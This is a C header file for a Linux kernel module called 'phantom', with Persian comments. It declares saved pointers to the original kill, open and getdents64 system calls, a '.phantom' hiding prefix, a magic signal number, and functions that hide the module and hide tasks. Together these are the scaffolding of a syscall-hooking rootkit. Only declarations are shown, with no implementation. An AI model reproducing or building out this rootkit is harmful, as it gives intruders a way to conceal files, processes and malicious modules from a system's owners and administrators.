#ifndef PHANTOM_DEFS_H
#define PHANTOM_DEFS_H

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <net/sock.h>

#define PHANTOM_PREFIX ".phantom"
#define PHANTOM_SIGNAL 64

// تعاریف توابع
asmlinkage long (*orig_kill)(pid_t pid, int sig);
asmlinkage long (*orig_open)(const char __user *filename, int flags, umode_t mode);
asmlinkage long (*orig_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);

// توابع پنهان‌سازی
void hide_phantom_module(void);
void hide_task(struct task_struct *task);

#endif
